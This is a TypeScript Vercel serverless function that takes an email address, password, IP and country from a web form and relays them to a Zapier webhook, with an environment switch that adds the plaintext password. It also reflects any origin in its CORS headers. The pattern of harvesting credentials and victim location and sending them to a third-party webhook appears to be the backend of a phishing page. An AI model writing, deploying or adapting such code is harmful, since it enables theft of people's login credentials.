import type { VercelRequest, VercelResponse } from '@vercel/node';

// Use global fetch (Node 18+) to avoid node-fetch version issues in Vercel.
// If you still want node-fetch, ensure it is in package.json dependencies.
const ZAPIER_WEBHOOK = process.env.ZAPIER_WEBHOOK || '';
const FORWARD_PASSWORD = String(process.env.FORWARD_PASSWORD || '0') === '1';
const RECAPTCHA_SECRET = process.env.RECAPTCHA_SECRET || '';

const RATE_LIMIT_WINDOW_MS = 60_000; // 60s window
const RATE_LIMIT_MAX = 20; // max requests per IP per window
const ipMap = new Map<string, { count: number; windowStart: number }>();

function isRateLimited(ip: string) {
  const now = Date.now();
  const rec = ipMap.get(ip);
  if (!rec || now - rec.windowStart > RATE_LIMIT_WINDOW_MS) {
    ipMap.set(ip, { count: 1, windowStart: now });
    return false;
  }
  rec.count += 1;
  ipMap.set(ip, rec);
  return rec.count > RATE_LIMIT_MAX;
}

function validateEmail(email: string) {
  if (!email) return false;
  if (email.length > 254) return false;
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

async function verifyRecaptcha(token: string, remoteip?: string) {
  if (!RECAPTCHA_SECRET) return true; // skip if not configured
  try {
    const res = await fetch('https://www.google.com/recaptcha/api/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${encodeURIComponent(RECAPTCHA_SECRET)}&response=${encodeURIComponent(token)}${remoteip ? `&remoteip=${encodeURIComponent(remoteip)}` : ''}`
    });
    const json = await res.json();
    return !!json.success && (json.score === undefined || json.score >= 0.3);
  } catch (err) {
    console.error('recaptcha verification error', err);
    return false;
  }
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS: very permissive here for testing. In production set a specific origin.
  const origin = req.headers.origin || '*';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (!ZAPIER_WEBHOOK) {
    return res.status(500).json({ success: false, error: 'Server not configured (missing ZAPIER_WEBHOOK)' });
  }

  // x-forwarded-for may contain a list of IPs: take the first one
  const xff = (req.headers['x-forwarded-for'] || '') as string;
  const clientIp = (xff.split(',')[0]?.trim()) || (req.connection && (req.connection as any).remoteAddress) || '';

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Only POST allowed' });
  }

  if (isRateLimited(clientIp)) {
    return res.status(429).json({ success: false, error: 'Too many requests' });
  }

  const body = req.body || {};
  const { email, ip, country, password, recaptchaToken } = body as any;

  if (!email || !validateEmail(email)) {
    return res.status(400).json({ success: false, error: 'Invalid email' });
  }

  if (recaptchaToken) {
    const ok = await verifyRecaptcha(recaptchaToken, clientIp);
    if (!ok) return res.status(400).json({ success: false, error: 'Recaptcha failed' });
  }

  const forwardPayload: any = {
    email,
    ip: ip || '',
    country: country || '',
    timestamp: new Date().toISOString(),
    clientIp,
  };

  if (FORWARD_PASSWORD && typeof password === 'string' && password.length > 0) {
    forwardPayload.password = password;
  }

  try {
    // Use the global fetch in Node 18+ (Vercel runtime)
    const zapRes = await fetch(ZAPIER_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(forwardPayload),
    });

    if (!zapRes.ok) {
      const text = await zapRes.text().catch(() => '');
      console.error('Zapier non-OK', zapRes.status, text);
      return res.status(502).json({ success: false, error: 'Failed to forward to Zapier' });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Forward error', err);
    return res.status(500).json({ success: false, error: 'Server error' });
  }
}
